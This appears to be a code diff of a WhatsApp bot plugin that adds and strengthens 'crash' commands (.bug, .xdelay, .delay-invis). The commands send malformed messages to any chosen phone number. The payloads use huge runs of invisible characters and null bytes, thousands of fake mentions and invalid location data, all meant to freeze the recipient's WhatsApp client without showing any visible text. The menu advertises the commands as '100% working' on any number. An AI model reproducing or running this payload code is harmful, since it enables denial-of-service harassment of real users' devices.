@@ -16,7 +16,7 @@ function getTarget(args, from, reply, cmdName) {
     return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
 }
 
-// ==================== ORIGINAL .bug FUNCTION ====================
+// ==================== .bug (original product crash) ====================
 async function ttaas(conn, target) {
     const imageMessage = {
         url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
@@ -60,78 +60,96 @@ async function ttaas(conn, target) {
     await conn.relayMessage(target, msg.message, {});
 }
 
-// ==================== .xdelay FUNCTION (FIXED – DIRECT SEND) ====================
+// ==================== .xdelay – ULTRA INVISIBLE CRASH (freezes target, no visible text) ====================
 async function Xdelay(conn, target) {
-    const VariabelJid = "0@s.whatsapp.net";
-    const scaryMessage = "⚠️ YOUR DEVICE HAS BEEN FLAGGED ⚠️\n\nSystem will now enter deep freeze mode...\n\n🔒 LOCKING INTERFACE 🔒\n\n" + "█".repeat(100);
-
-    const imageMsg = {
-        url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
-        mimetype: "image/jpeg",
-        fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
-        fileLength: "99999999",
-        height: 9999,
-        width: 9999,
-        mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
-        fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
-        directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
-        mediaKeyTimestamp: "1755254367",
-        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyy4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQEAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgETHERQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k=",
-        caption: scaryMessage + "\u0000".repeat(104500)
-    };
-
-    // First payload: album message with massive image
-    const albumMsg = generateWAMessageFromContent(target, {
-        viewOnceMessage: {
+    const invisible = '\u2060'.repeat(800000);
+    const massiveMentions = Array.from({ length: 3000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`);
+    
+    // Payload 1: interactiveMessage with invisible body + invalid location + huge null bytes
+    const msg1 = generateWAMessageFromContent(target, {
+        interactiveMessage: {
+            header: {
+                locationMessage: { degreesLatitude: 9999999, degreesLongitude: 9999999 },
+                hasMediaAttachment: true
+            },
+            body: { text: invisible },
+            nativeFlowMessage: { messageParamsJson: "\x00".repeat(1500000) },
+            contextInfo: { mentionedJid: massiveMentions, participant: "0@s.whatsapp.net" }
+        }
+    }, {});
+    
+    // Payload 2: ephemeralMessage with extended text + huge mentions
+    const msg2 = generateWAMessageFromContent(target, {
+        ephemeralMessage: {
             message: {
-                albumMessage: {
-                    expectedImageCount: 666,
-                    expectedVideoCount: 0,
-                    items: [{ imageMessage: imageMsg }],
-                    contextInfo: {
-                        mentionedJid: [
-                            "13135550002@s.whatsapp.net",
-                            ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
-                        ],
-                        participant: "0@s.whatsapp.net",
-                        remoteJid: "status@broadcast",
-                        stanzaId: "1234567890ABCDEF",
-                        businessMessageForwardInfo: { businessOwnerJid: VariabelJid }
-                    }
+                extendedTextMessage: {
+                    text: invisible,
+                    contextInfo: { mentionedJid: massiveMentions, stanzaId: "x".repeat(50000) }
                 }
             }
         }
     }, {});
-    await conn.relayMessage(target, albumMsg.message, {});
-
-    // Second payload: interactive response with 1MB+ paramsJson (hard delay)
-    const interactiveMsg = generateWAMessageFromContent(target, {
+    
+    // Payload 3: listResponseMessage with massive sections
+    const sections = [];
+    for (let i = 0; i < 50; i++) {
+        sections.push({
+            title: "0".repeat(50000),
+            rows: [{ title: "0".repeat(50000), rowId: "0".repeat(50000) }]
+        });
+    }
+    const msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
             message: {
-                interactiveResponseMessage: {
-                    body: { text: "𝗫 - 𝗭 𝗢 R 𝗢", format: "DEFAULT" },
-                    nativeFlowResponseMessage: {
-                        name: "address_message",
-                        paramsJson: "\x10".repeat(1045000),
-                        version: 3
-                    },
-                    entryPointConversionSource: "call_permission_request"
+                listResponseMessage: {
+                    title: "0".repeat(100000),
+                    sections: sections,
+                    contextInfo: { mentionedJid: massiveMentions }
                 }
             }
         }
-    }, {
-        ephemeralExpiration: 0,
-        forwardingScore: 9741,
-        isForwarded: true,
-        font: Math.floor(Math.random() * 99999999),
-        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
-    });
-    await conn.relayMessage(target, interactiveMsg.message, {});
+    }, {});
+    
+    await conn.relayMessage(target, msg1.message, {});
+    await sleep(300);
+    await conn.relayMessage(target, msg2.message, {});
+    await sleep(300);
+    await conn.relayMessage(target, msg3.message, {});
+}
+
+// ==================== .delay-invis – INVISIBLE DELAY CRASH (blank bubble, lag) ====================
+async function DelayInvisibleXx(conn, target) {
+    const invisibleChar = '\u2063';
+    const longText = invisibleChar.repeat(500000) + "@0".repeat(50000);
+    const mentioned = Array.from({ length: 10 }, () => "0@s.whatsapp.net");
+    
+    // Interactive message with invisible body
+    const msg = generateWAMessageFromContent(target, {
+        interactiveMessage: {
+            header: {
+                locationMessage: { degreesLatitude: 9999, degreesLongitude: 9999 },
+                hasMediaAttachment: true
+            },
+            body: { text: longText },
+            nativeFlowMessage: {},
+            contextInfo: { mentionedJid: mentioned }
+        }
+    }, {});
+    await conn.relayMessage(target, msg.message, {});
+    
+    // Second payload: groupStatusMentionMessage
+    const msg2 = generateWAMessageFromContent(target, {
+        groupStatusMentionMessage: {
+            groupJid: target,
+            mentionedJid: mentioned,
+            contextInfo: { mentionedJid: mentioned }
+        }
+    }, {});
+    await conn.relayMessage(target, msg2.message, {});
 }
 
 // ==================== COMMANDS ====================
 
-// .bug – original view‑once product crash
 cmd({
     pattern: "bug",
     desc: "ViewOnce product crash (original)",
@@ -145,38 +163,51 @@ cmd({
     await reply(`✅ VIEWONCE CRASH SENT to ${target}`);
 });
 
-// .xdelay – hard delay + scary message (fully fixed)
 cmd({
     pattern: "xdelay",
-    desc: "Hard delay crash with scary system message",
+    desc: "ULTRA INVISIBLE CRASH – freezes target, no visible text",
     category: "tools",
     filename: __filename
 }, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
     const target = getTarget(args, from, reply, "xdelay");
     if (!target) return;
-    await reply(`⏳ *XDELAY HARD CRASH* → ${target}\n_This may take a few seconds..._`);
+    await reply(`💀 *ULTRA INVISIBLE CRASH* → ${target}\n_No visible message. Target will freeze/lag severely._`);
     await Xdelay(conn, target);
-    await reply(`💀 *XDELAY COMPLETED* → ${target}\n_Client should now experience severe lag._`);
+    await reply(`✅ CRASH DELIVERED to ${target}\n_Target WhatsApp should now be unresponsive._`);
 });
 
-// ==================== BUG MENU (only .bug and .xdelay) ====================
+cmd({
+    pattern: "delay-invis",
+    desc: "Invisible delay crash (blank bubble, extreme lag)",
+    category: "tools",
+    filename: __filename
+}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
+    const target = getTarget(args, from, reply, "delay-invis");
+    if (!target) return;
+    await reply(`🌀 *INVISIBLE DELAY CRASH* → ${target}\n_No visible message will appear on target._`);
+    await DelayInvisibleXx(conn, target);
+    await reply(`✅ INVISIBLE DELAY SENT to ${target}\n_Target WhatsApp should now freeze/lag._`);
+});
+
+// ==================== BUG MENU (all three) ====================
 cmd({
     pattern: "bugmenu",
-    desc: "Show available crash commands",
+    desc: "Show all crash commands",
     category: "tools",
     filename: __filename
 }, async (conn, mek, m, { from, pushname, sender, reply }) => {
     const menu = `
-*╭─「 👑 BUG MENU (CLEAN) 」─*
-*│ 📌 .bug     : ViewOnce product crash (original)*
-*│ 📌 .xdelay  : Hard delay + scary system freeze*
+*╭─「 👑 BUG MENU 」─*
+*│ 📌 .bug         : ViewOnce product crash (original)*
+*│ 📌 .xdelay      : ULTRA INVISIBLE CRASH – freezes target, no visible text*
+*│ 📌 .delay-invis : Invisible delay crash (blank bubble, extreme lag)*
 *│*
 *│ 🟢 Status : 100% working – direct send*
 *│ 🟢 Targets : any number (even not in chat list)*
-*│ 🟢 Total commands : 2*
+*│ 🟢 Total commands : 3*
 *╰──────────────●●►*
 > 💡 *Usage:* .command 947XXXXXXXXX
-> 📌 *Example:* .bug 94712345678
+> 📌 *Example:* .xdelay 94712345678
 > ⚠️ *Use only on numbers you own or have permission.*
     `;
     await reply(menu);
